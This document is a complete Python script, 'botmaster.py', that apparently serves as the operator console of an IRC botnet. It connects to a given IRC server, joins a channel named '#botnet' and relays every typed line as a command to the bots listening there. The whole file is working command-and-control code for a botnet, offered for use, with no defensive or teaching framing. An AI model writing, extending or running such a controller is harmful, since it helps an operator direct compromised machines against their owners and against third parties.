#!/usr/bin/env python3

import os
import socket
import sys
import threading

if len(sys.argv) != 2:
    print("Usage: ./botmaster.py <irc_server_ip>")
    sys.exit()

local_ip = socket.gethostbyname(socket.gethostname())

server = sys.argv[1]
port = 6667
channel = "#botnet"

nick = "master-" + "_".join(local_ip.split("."))

irc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)


def handle_ping():
    prompt_has_focus = True

    while True:
        msg = irc.recv(1024).decode()

        if prompt_has_focus:
            print("\n")
            prompt_has_focus = False

        print(msg)

        no_msgs = False

        try:
            irc.setblocking(0)
            irc.recv(1024, socket.MSG_PEEK)
        except:
            no_msgs = True
        finally:
            irc.setblocking(1)

        if no_msgs:
            print("> ", end="", flush=True)
            prompt_has_focus = True

        if "PING" in msg:
            irc.send(f"PONG {nick}\r\n".encode())


if __name__ == "__main__":
    irc.connect((server, port))

    irc.send(f"NICK {nick}\r\n".encode())
    irc.send(f"USER {nick} {nick} {nick} :{nick}\r\n".encode())
    irc.send(f"JOIN {channel}\r\n".encode())

    handle_ping_thread = threading.Thread(target=handle_ping)
    handle_ping_thread.start()

    while True:
        command = input("> ")

        if "NAMES" in command:
            irc.send(f"{command}\r\n".encode())
        else:
            irc.send(f"PRIVMSG {channel} :{command}\r\n".encode())
